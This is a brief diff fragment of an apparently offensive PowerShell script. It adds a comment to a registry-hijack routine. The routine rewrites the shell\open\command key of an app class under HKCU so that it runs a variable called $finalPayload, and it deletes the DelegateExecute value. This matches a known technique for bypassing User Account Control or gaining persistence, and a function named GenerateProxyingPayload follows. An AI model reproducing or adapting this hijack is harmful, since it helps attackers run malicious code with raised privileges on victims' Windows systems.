@@ -20,7 +20,7 @@ Begin {
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\" -Name "open"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\open\" -Name "command"
         Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$finalPayload"
-        Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute"
+        Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute" # remove the {CLSID} pointing to "%SystemRoot%\system32\twinui.dll"
     }
 
     function GenerateProxyingPayload($p, $d, $g)
